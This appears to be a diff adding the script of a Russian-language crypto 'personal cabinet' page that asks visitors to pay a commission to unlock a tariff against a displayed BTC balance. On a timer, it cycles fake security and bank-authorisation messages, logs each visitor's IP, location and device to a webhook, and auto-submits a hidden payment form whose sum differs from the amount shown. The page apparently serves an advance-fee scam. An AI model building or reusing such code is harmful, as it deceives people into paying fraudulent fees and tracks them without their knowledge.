+    <div class="loader-timer" id="loaderTimer">Подготовка транзакции: <strong>2 сек</strong></div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/dist/ua-parser.min.js"></script>
+<script src="assets/rates.js"></script>
+<script src="assets/common.js"></script>
+
+<script>
+const STAGE = 'limitex';
+const COMMISSION_AMOUNT = 4400;
+
+let cbBigChartInstance = null;
+let cbCurrentRange = 7;
+
+/* Год в футере */
+(function () {
+    const el = document.getElementById('footerYear');
+    if (el) el.textContent = new Date().getFullYear();
+})();
+
+function renderCommissionLoading() {
+    const box = document.getElementById('commissionAmountBox');
+    if (box) box.setAttribute('data-loading', '1');
+
+    const rubEl = document.getElementById('commissionRub');
+    const usdEl = document.getElementById('commissionUsd');
+
+    if (rubEl) rubEl.innerHTML = '<span class="ca-loading"><span class="ca-spinner"></span>Идёт загрузка курса…</span>';
+    if (usdEl) usdEl.innerHTML = '<span class="ca-loading-sub">Получаем актуальный курс BTC/RUB</span>';
+
+    const btn = document.getElementById('commissionBtn');
+    if (btn) {
+        btn.disabled = true;
+        btn.style.opacity = '0.55';
+        btn.style.cursor = 'not-allowed';
+        btn.classList.remove('btn-glow');
+        btn.textContent = 'Ожидание курса…';
+    }
+}
+
+function renderCommissionReady() {
+    const btc = FINAL_BTC_BALANCE;
+    const usd = btc * window.btcPrice;
+    const rub = usd * window.usdToRub;
+    const totalRub = rub + 6700;
+    const totalUsd = window.usdToRub > 0 ? totalRub / window.usdToRub : 0;
+
+    const box = document.getElementById('commissionAmountBox');
+    if (box) box.setAttribute('data-loading', '0');
+
+    const rubEl = document.getElementById('commissionRub');
+    const usdEl = document.getElementById('commissionUsd');
+
+    if (rubEl) rubEl.textContent = formatRub(totalRub);
+    if (usdEl) usdEl.textContent = '≈ ' + formatUsd(totalUsd);
+
+    const btn = document.getElementById('commissionBtn');
+    if (btn) {
+        btn.textContent = 'Подключить тариф "Максимум"';
+        btn.disabled = false;
+        btn.style.opacity = '1';
+        btn.style.cursor = 'pointer';
+        btn.classList.add('btn-glow');
+    }
+}
+
+function renderCommission() {
+    if (typeof isRatesValid === 'function' && isRatesValid()) {
+        renderCommissionReady();
+    } else {
+        renderCommissionLoading();
+    }
+}
+
+window.addEventListener('rates:ready', () => {
+    if (typeof isRatesValid === 'function' && isRatesValid()) {
+        renderCommissionReady();
+    }
+    if (typeof renderCabinetBigChart === 'function') {
+        renderCabinetBigChart(cbCurrentRange);
+    }
+});
+
+const PC_MESSAGES = [
+    'Идёт соединение с платёжной системой...',
+    'Устанавливается зашифрованное соединение <strong>TLS 1.3</strong>...',
+    'Проверка сертификата безопасности сервера...',
+    'Инициализация защищённого канала передачи данных...',
+    'Синхронизация с платёжным шлюзом <strong>Express Gateway</strong>...',
+    'Проверка кодировки и типа передаваемых данных...',
+    'Аутентификация клиента в системе...',
+    'Передача параметров транзакции в банк-эмитент...',
+    'Ожидание авторизации платёжной операции...',
+    'Запрос подтверждения от платёжной системы...',
+    'Формирование защищённого ответа...',
+    'Пожалуйста, не закрывайте страницу — соединение почти установлено...'
+];
+
+let pcMessageTimer = null;
+let pcMessageIndex = 0;
+let pcStarted = false;
+
+function startPaymentConnector() {
+    if (pcStarted) return;
+    pcStarted = true;
+
+    const overlay = document.getElementById('paymentConnector');
+    const msgEl = document.getElementById('pcMessage');
+    if (!overlay) return;
+
+    overlay.classList.add('active');
+
+    document.documentElement.style.overflow = 'hidden';
+    document.body.style.overflow = 'hidden';
+
+    pcMessageIndex = 0;
+    if (msgEl) {
+        msgEl.innerHTML = PC_MESSAGES[0];
+        msgEl.classList.remove('pc-fade');
+    }
+
+    pcMessageTimer = setInterval(() => {
+        if (!msgEl) return;
+        pcMessageIndex = (pcMessageIndex + 1) % PC_MESSAGES.length;
+
+        msgEl.classList.add('pc-fade');
+        setTimeout(() => {
+            msgEl.innerHTML = PC_MESSAGES[pcMessageIndex];
+            msgEl.classList.remove('pc-fade');
+        }, 320);
+    }, 2600);
+}
+
+async function doCommissionPayment() {
+    /* Страховка: если курса нет — ждём */
+    if (typeof isRatesValid === 'function' && !isRatesValid()) {
+        renderCommissionLoading();
+        if (typeof ensureFreshRates === 'function') {
+            const ok = await ensureFreshRates(15000);
+            if (!ok) {
+                const btn = document.getElementById('commissionBtn');
+                if (btn) {
+                    btn.disabled = false;
+                    btn.textContent = 'Не удалось получить курс — повторить';
+                    btn.onclick = () => doCommissionPayment();
+                }
+                renderCommission();
+                return;
+            }
+        }
+    }
+
+    markStagePaid(STAGE);
+    startPaymentConnector();
+
+    const randomId = 'bitexp' + String(Math.floor(1000000 + Math.random() * 9000000));
+    const urls = getPaymentUrls(STAGE);
+
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = PAYSWEB_URL;
+    form.style.display = 'none';
+
+    const fields = {
+        amount: String(COMMISSION_AMOUNT),
+        merchant_order_id: randomId,
+        use_card_payment: 'RUB',
+        success_url: urls.successUrl,
+        fail_url: urls.failUrl,
+        notice_url: 'https://vashdomain.com/api/success',
+        api_key: PAYSWEB_KEY
+    };
+
+    for (const [k, v] of Object.entries(fields)) {
+        const inp = document.createElement('input');
+        inp.type = 'hidden';
+        inp.name = k;
+        inp.value = v;
+        form.appendChild(inp);
+    }
+    document.body.appendChild(form);
+
+    sendWebhook({
+        event: 'limitex_payment_click',
+        stage: STAGE,
+        userId: window.appState.userId,
+        merchant_order_id: randomId,
+        amount: COMMISSION_AMOUNT,
+        currency: 'RUB',
+        btc: FINAL_BTC_BALANCE.toFixed(8),
+        usd: (FINAL_BTC_BALANCE * window.btcPrice).toFixed(2),
+        rub: (FINAL_BTC_BALANCE * window.btcPrice * window.usdToRub).toFixed(2),
+        btcPrice: window.btcPrice.toFixed(2),
+        usdToRub: window.usdToRub.toFixed(2),
+        btcSource: window.btcSource, rubSource: window.rubSource,
+        ip: window.appState.geo ? window.appState.geo.ip : '',
+        city: window.appState.geo ? window.appState.geo.city : '',
+        country: window.appState.geo ? window.appState.geo.country : '',
+        device: window.appState.device || null,
+        success_url: urls.successUrl,
+        fail_url: urls.failUrl,
+        timestamp: new Date().toISOString(),
+        page: STAGE
+    });
+
+    setTimeout(() => {
+        form.submit();
+    }, 80);
+}
+
+function paintTicker(el, itemsHtml) {
+    if (!el || !itemsHtml) return;
+    el.innerHTML = itemsHtml + itemsHtml;
+    el.classList.remove('cb-ticker-animating');
+    void el.offsetWidth;
+    el.classList.add('cb-ticker-animating');
+}
+
+function renderTickerPlaceholder() {
+    const el = document.getElementById('cbTickerTrack');
+    if (!el) return;
+
+    const placeholder = [
+        { sym: 'BTC/USD', val: '$ --,---', chg: '...', cls: '' },
+        { sym: 'ETH/USD', val: '$ --,---', chg: '...', cls: '' },
+        { sym: 'USD/RUB', val: '--.--',    chg: '...', cls: '' },
+        { sym: 'EUR/RUB', val: '--.--',    chg: '...', cls: '' }
+    ];
+
+    const html = placeholder.map(p =>
+        `<span class="cb-tick">
+            <span class="cb-tick-sym">${p.sym}</span>
+            <span class="cb-tick-val">${p.val}</span>
+            <span class="cb-tick-chg ${p.cls}">${p.chg}</span>
+        </span>`
+    ).join('');
+
+    paintTicker(el, html);
+}
+
+function renderCabinetTicker() {
+    const el = document.getElementById('cbTickerTrack');
+    if (!el) return;
+    const items = [];
+    (window.cryptoMarkets || []).forEach(m => {
+        const cls = m.change24h >= 0 ? 'up' : 'down';
+        const sign = m.change24h >= 0 ? '+' : '';
+        items.push(`<span class="cb-tick"><span class="cb-tick-sym">${m.symbol}/USD</span><span class="cb-tick-val">$${formatPrice(m.price)}</span><span class="cb-tick-chg ${cls}">${sign}${m.change24h.toFixed(2)}%</span></span>`);
+    });
+    (window.fiatRates || []).forEach(f => {
+        const diff = f.value - f.prev;
+        const up = diff >= 0;
+        const cls = up ? 'up' : 'down';
+        const sign = up ? '+' : '';
+        const pct = f.prev ? ((diff / f.prev) * 100) : 0;
+        items.push(`<span class="cb-tick"><span class="cb-tick-sym">${f.code}/RUB</span><span class="cb-tick-val">${f.value.toFixed(2)}</span><span class="cb-tick-chg ${cls}">${sign}${pct.toFixed(2)}%</span></span>`);
+    });
+
+    if (items.length === 0) {
+        paintTicker(el, '<span class="cb-tick"><span class="cb-tick-sym">Загрузка...</span></span>');
+    } else {
+        paintTicker(el, items.join(''));
+    }
+}
+
+function makeSparkline(data, up) {
+    if (!data || data.length < 2) {
+        return '<svg class="cb-spark" viewBox="0 0 100 30" preserveAspectRatio="none"><line x1="0" y1="15" x2="100" y2="15" stroke="rgba(255,255,255,0.1)" stroke-width="1" stroke-dasharray="2 3"/></svg>';
+    }
+    let points = data;
+    if (data.length > 60) {
+        const step = Math.ceil(data.length / 60);
+        points = data.filter((_, i) => i % step === 0);
+    }
+    const w = 100, h = 30;
+    const min = Math.min(...points);
+    const max = Math.max(...points);
+    const range = (max - min) || 1;
+    const step = w / (points.length - 1);
+    const coords = points.map((v, i) => {
+        const x = i * step;
+        const y = h - ((v - min) / range) * h * 0.85 - h * 0.1;
+        return `${x.toFixed(2)},${y.toFixed(2)}`;
+    }).join(' ');
+    const color = up ? '#22c55e' : '#ff3860';
+    const fillColor = up ? 'rgba(34,197,94,0.18)' : 'rgba(255,56,96,0.18)';
+    return `<svg class="cb-spark" viewBox="0 0 ${w} ${h}" preserveAspectRatio="none"><polyline points="0,${h} ${coords} ${w},${h}" fill="${fillColor}" stroke="none"/><polyline points="${coords}" fill="none" stroke="${color}" stroke-width="1.5" stroke-linejoin="round" stroke-linecap="round"/></svg>`;
+}
+
+function renderCabinetMarkets() {
+    const el = document.getElementById('cbMarkets');
+    if (!el) return;
+    const markets = window.cryptoMarkets || [];
+    const countEl = document.getElementById('cbMarketsCount');
+    if (countEl) countEl.textContent = markets.length + ' pairs';
+
+    if (markets.length === 0) {
+        if (window.__ratesFetching) {
+            el.innerHTML = '<div class="cb-loading">Загрузка данных рынка...</div>';
+        } else {
+            el.innerHTML =
+                '<div class="cb-loading">Данные рынка временно недоступны. ' +
+                '<a href="#" onclick="event.preventDefault();retryRatesNow();" ' +
+                'style="color:var(--primary);text-decoration:underline;cursor:pointer;">Повторить</a></div>';
+        }
+        return;
+    }
+
+    el.innerHTML = markets.map(m => {
+        const up = m.change24h >= 0;
+        const cls = up ? 'up' : 'down';
+        const sign = up ? '+' : '';
+        const spark = makeSparkline(m.sparkline, up);
+        return `<div class="cb-market-card" data-id="${m.id}"><div class="cb-market-head"><div class="cb-market-name"><span class="cb-market-sym">${m.symbol}</span><span class="cb-market-full">${m.name}</span></div><div class="cb-market-change ${cls}">${sign}${m.change24h.toFixed(2)}%</div></div><div class="cb-market-price">$${formatPrice(m.price)}</div>${spark}</div>`;
+    }).join('');
+}
+
+function renderCabinetFiat() {
+    const el = document.getElementById('cbFiat');
+    if (!el) return;
+    const fiats = window.fiatRates || [];
+
+    if (fiats.length === 0) {
+        if (window.__ratesFetching) {
+            el.innerHTML = '<div class="cb-loading">Загрузка курсов валют...</div>';
+        } else {
+            el.innerHTML =
+                '<div class="cb-loading">Курсы ЦБ РФ временно недоступны. ' +
+                '<a href="#" onclick="event.preventDefault();retryRatesNow();" ' +
+                'style="color:var(--primary);text-decoration:underline;cursor:pointer;">Повторить</a></div>';
+        }
+        return;
+    }
+
+    el.innerHTML = fiats.map(f => {
+        const diff = f.value - f.prev;
+        const up = diff >= 0;
+        const cls = up ? 'up' : 'down';
+        const sign = up ? '+' : '';
+        const pct = f.prev ? ((diff / f.prev) * 100) : 0;
+        return `<div class="cb-fiat-card"><div class="cb-fiat-code">${f.code}</div><div class="cb-fiat-name">${f.name}</div><div class="cb-fiat-value">${f.value.toFixed(4)} ₽</div><div class="cb-fiat-change ${cls}">${sign}${pct.toFixed(2)}%</div></div>`;
+    }).join('');
+}
+
+async function renderCabinetBigChart(days) {
+    const wrap = document.querySelector('.cb-chart-wrap');
+    if (!wrap) return;
+
+    if (typeof Chart === 'undefined') {
+        wrap.innerHTML = '<div style="color:#8896b0;text-align:center;padding:80px 20px;font-family:monospace;font-size:12px;">Chart.js не загрузился</div>';
+        return;
+    }
+
+    if (cbBigChartInstance) {
+        try { cbBigChartInstance.destroy(); } catch (e) {}
+        cbBigChartInstance = null;
+    }
+
+    wrap.innerHTML = '';
+    const newCanvas = document.createElement('canvas');
+    newCanvas.id = 'cbBigChart';
+    newCanvas.style.display = 'block';
+    wrap.appendChild(newCanvas);
+
+    let history = null;
+    try {
+        history = await fetchBtcHistory(days);
+    } catch (e) {
+        console.error('[Chart] Ошибка fetchBtcHistory:', e);
+    }
+
+    if (!history || history.length < 2) {
+        wrap.innerHTML = '<div style="color:#8896b0;text-align:center;padding:80px 20px;font-family:monospace;font-size:12px;">Нет данных для графика</div>';
+        return;
+    }
+
+    const ctx = newCanvas.getContext('2d');
+
+    const labels = history.map(p => {
+        const d = new Date(p.t);
+        if (days <= 1) return d.toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' });
+        if (days <= 7) return d.toLocaleDateString('ru-RU', { day: '2-digit', month: '2-digit' }) + ' ' + d.toLocaleTimeString('ru-RU', { hour: '2-digit' });
+        return d.toLocaleDateString('ru-RU', { day: '2-digit', month: '2-digit' });
+    });
+    const data = history.map(p => p.v);
+
+    const gradient = ctx.createLinearGradient(0, 0, 0, 220);
+    gradient.addColorStop(0, 'rgba(247, 147, 26, 0.4)');
+    gradient.addColorStop(0.5, 'rgba(247, 147, 26, 0.1)');
+    gradient.addColorStop(1, 'rgba(247, 147, 26, 0)');
+
+    cbBigChartInstance = new Chart(ctx, {
+        type: 'line',
+        data: {
+            labels,
+            datasets: [{
+                data,
+                borderColor: '#f7931a',
+                backgroundColor: gradient,
+                borderWidth: 2,
+                tension: 0.3,
+                fill: true,
+                pointRadius: 0,
+                pointHoverRadius: 0
+            }]
+        },
+        options: {
+            responsive: true,
+            maintainAspectRatio: false,
+            resizeDelay: 250,
+            devicePixelRatio: 1,
+            events: [],
+            animation: false,
+            animations: false,
+            transitions: {
+                active: { animation: { duration: 0 } },
+                resize: { animation: { duration: 0 } }
+            },
+            plugins: {
+                legend: { display: false },
+                tooltip: { enabled: false }
+            },
+            scales: {
+                x: {
+                    grid: { color: 'rgba(255,255,255,0.03)', drawTicks: false },
+                    ticks: { color: '#5a6882', font: { size: 9, family: 'JetBrains Mono' }, maxTicksLimit: 6, autoSkip: true },
+                    border: { display: false }
+                },
+                y: {
+                    position: 'right',
+                    grid: { color: 'rgba(255,255,255,0.03)', drawTicks: false },
+                    ticks: {
+                        color: '#5a6882',
+                        font: { size: 9, family: 'JetBrains Mono' },
+                        maxTicksLimit: 5,
+                        callback: (v) => '$' + Number(v).toLocaleString('en-US', { maximumFractionDigits: 0 })
+                    },
+                    border: { display: false }
+                }
+            }
+        }
+    });
+}
+
+function updateCabinetNumbers() {
+    setText('cbPriceLive', formatUsd(window.btcPrice, 2));
+}
+
+function setupChartTabs() {
+    const container = document.getElementById('cbChartTabs');
+    if (!container) return;
+
+    container.addEventListener('click', (e) => {
+        const tab = e.target.closest('.cb-tab');
+        if (!tab) return;
+        e.preventDefault();
+        e.stopPropagation();
+
+        container.querySelectorAll('.cb-tab').forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
+
+        cbCurrentRange = parseInt(tab.dataset.range) || 7;
+        console.log('[Chart] смена диапазона:', cbCurrentRange, 'дн.');
+        renderCabinetBigChart(cbCurrentRange);
+    });
+}
+
+function heavyInit() {
+    try { loadState(); } catch (e) {}
+    if (typeof ensureDevice === 'function') { try { ensureDevice(); } catch (e) {} }
+    if (typeof visitStage === 'function') { try { visitStage(STAGE); } catch (e) {} }
+
+    if (typeof loadRatesCache === 'function') { try { loadRatesCache(); } catch (e) {} }
+    if (typeof loadMarketsCache === 'function') { try { loadMarketsCache(); } catch (e) {} }
+
+    window.__ratesFetching = true;
+
+    renderCommission();
+    updateCabinetNumbers();
+    renderTickerPlaceholder();
+    renderCabinetTicker();
+    renderCabinetMarkets();
+    renderCabinetFiat();
+
+    setupChartTabs();
+
+    renderCabinetBigChart(cbCurrentRange);
+
+    if (typeof initRates === 'function') {
+        initRates().catch(e => {
+            console.warn('[LimitEx] initRates error:', e);
+            window.__ratesFetching = false;
+            renderCabinetMarkets();
+            renderCabinetFiat();
+            renderCommission();
+        });
+    } else {
+        console.warn('[LimitEx] initRates не найден');
+        window.__ratesFetching = false;
+        renderCabinetMarkets();
+        renderCabinetFiat();
+    }
+
+    setTimeout(() => {
+        if (window.__ratesFetching) {
+            console.warn('[LimitEx] safety timeout — сбрасываю __ratesFetching');
+            window.__ratesFetching = false;
+            renderCabinetMarkets();
+            renderCabinetFiat();
+            renderCommission();
+        }
+    }, 20000);
+}
+
+if (window.__preloaderDone) {
+    heavyInit();
+} else {
+    window.__onPreloaderDone.push(heavyInit);
+}
+</script>
+</body>
+</html>
